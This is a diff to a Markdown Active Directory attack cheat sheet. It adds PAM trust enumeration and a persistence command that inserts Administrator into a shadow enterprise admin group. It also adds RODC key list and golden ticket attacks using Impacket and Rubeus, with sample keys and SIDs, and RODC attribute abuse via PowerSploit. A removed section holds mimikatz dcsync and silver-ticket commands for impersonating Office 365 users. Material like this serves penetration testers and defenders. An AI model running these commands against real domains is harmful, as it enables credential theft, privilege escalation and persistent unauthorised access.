@@ -125,11 +125,13 @@
     - [SCCM Network Access Accounts](#sccm-network-access-accounts)
     - [SCCM Shares](#sccm-shares)
     - [WSUS Deployment](#wsus-deployment)
-    - [RODC - Read Only Domain Controller Compromise](#rodc---read-only-domain-controller-compromise)
+    - [RODC - Read Only Domain Controller](#rodc---read-only-domain-controller)
+      - [RODC Golden Ticket](#rodc-golden-ticket)
+      - [RODC Key List Attack](#rodc-key-list-attack)
+      - [RODC Computer Object](#rodc-computer-object)
     - [PXE Boot image attack](#pxe-boot-image-attack)
     - [DSRM Credentials](#dsrm-credentials)
     - [DNS Reconnaissance](#dns-reconnaissance)
-    - [Impersonating Office 365 Users on Azure AD Connect](#impersonating-office-365-users-on-azure-ad-connect)
   - [Linux Active Directory](#linux-active-directory)
     - [CCACHE ticket reuse from /tmp](#ccache-ticket-reuse-from-tmp)
     - [CCACHE ticket reuse from keyring](#ccache-ticket-reuse-from-keyring)
@@ -3391,7 +3393,12 @@ ls \\machine.domain.local\c$
 
 ### Privileged Access Management (PAM) Trust
 
-Require: Windows Server 2016 or earlier   
+> PAM (Privileged access managment) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs and without interactive logon. Temporary Group Membership also introduced so perms only given for set time.
+Enumeration
+
+Requirements: 
+* Windows Server 2016 or earlier   
+
 If we compromise the bastion we get `Domain Admins` privileges on the other domain
 
 * Default configuration for PAM Trust
@@ -3404,17 +3411,27 @@ If we compromise the bastion we get `Domain Admins` privileges on the other doma
     # execute on our bastion
     netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes
     ```
-* Enumerate
+* Enumerate PAM trusts
     ```ps1
-    # Using ADModule
+    # Detect if current forest is PAM trust
+    Import ADModule
     Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
 
     # Enumerate shadow security principals 
     Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
+
+    # Enumerate if current forest is managed by a bastion forest
+    # Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External
+    Get-ADTrust -Filter {(ForestTransitive -eq $True)} 
     ```
 * Compromise
+    * Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL, ...)
     * Using SID History
-    * Using the previously found Shadow Security Principal
+* Persistence
+  ```ps1
+  # Add a compromised user to the group 
+  Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=domain,DC=local"}
+  ```
 
 
 ### Kerberos Unconstrained Delegation
@@ -3882,26 +3899,52 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
 5. Check status deployment: `SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local`
 6. Clean up: `SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group`
 
-### RODC - Read Only Domain Controller Compromise
+### RODC - Read Only Domain Controller
 
-> If the user is included in the **Allowed RODC Password Replication**, their credentials are stored in the server, and the **msDS-RevealedList** attribute of the RODC is populated with the username.
+RODCs are an alternative for Domain Controllers in less secure physical locations
+- Contains a filtered copy of AD (LAPS and Bitlocker keys are excluded)
+- Any user or group specified in the **managedBy** attribute of an RODC has local admin access to the RODC server
+
+
+#### RODC Golden Ticket
+
+* You can forge an RODC golden ticket and present it to a writable Domain Controller only for principals listed in the RODC’s **msDS-RevealOnDemandGroup** attribute and not in the RODC’s **msDS-NeverRevealGroup** attribute
+
+
+#### RODC Key List Attack
 
 **Requirements**:
 * [Impacket PR #1210 - The Kerberos Key List Attack](https://github.com/SecureAuthCorp/impacket/pull/1210)
 * **krbtgt** credentials of the RODC (-rodcKey) 
 * **ID of the krbtgt** account of the RODC (-rodcNo)
 
-**Exploitation**:
-```ps1
-# keylistattack.py using SAMR user enumeration without filtering (-full flag)
-keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full
+* using Impacket
+  ```ps1
+  # keylistattack.py using SAMR user enumeration without filtering (-full flag)
+  keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full
 
-# keylistattack.py defining a target username (-t flag)
-keylistattack.py -kdc sever.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST
+  # keylistattack.py defining a target username (-t flag)
+  keylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST
 
-# secretsdump.py using the Kerberos Key List Attack option (-use-keylist)
-secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
-```
+  # secretsdump.py using the Kerberos Key List Attack option (-use-keylist)
+  secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
+  ```
+* Using Rubeus
+  ```ps1
+  Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871
+  Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=
+  ```
+
+
+#### RODC Computer Object
+
+When you have one the following permissions to the RODC computer object: **GenericWrite**, **GenericAll**, **WriteDacl**, **Owns**, **WriteOwner**, **WriteProperty**.
+
+* Add a domain admin account to the RODC's **msDS-RevealOnDemandGroup** attribute 
+  ```ps1
+  PowerSploit> Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}
+  ```
+
 
 ### PXE Boot image attack
 
@@ -3982,41 +4025,6 @@ New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLog
 # Change value to "2"
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
 ```
-
-### Impersonating Office 365 Users on Azure AD Connect
-
-Prerequisites: 
-
-* Obtain NTLM password hash of the AZUREADSSOACC account
-    ```powershell
-    mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
-    ```
-
-* AAD logon name of the user we want to impersonate (userPrincipalName or mail)
-    ```powershell
-    elrond@contoso.com
-    ```
-
-* SID of the user we want to impersonate
-    ```powershell
-    S-1-5-21-2121516926-2695913149-3163778339-1234
-    ```
-
-
-Create the Silver Ticket and inject it into Kerberos cache:
-```powershell
-mimikatz.exe "kerberos::golden /user:elrond
-/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
-/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
-/target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
-```
-
-Launch Mozilla Firefox, go to about:config
-```powershell
-network.negotiate-auth.trusted-uris="https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com".
-```
-
-Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.
 
 
 ## Linux Active Directory
@@ -4250,3 +4258,6 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022](https://aadinternals.com/post/gmsa/)
 * [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
 * [Poc’ing Beyond Domain Admin - Part 1 - cube0x0](https://cube0x0.github.io/Pocing-Beyond-DA/)
+* [At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06)
+* [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf](https://adsecurity.org/?p=3592)
+* [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
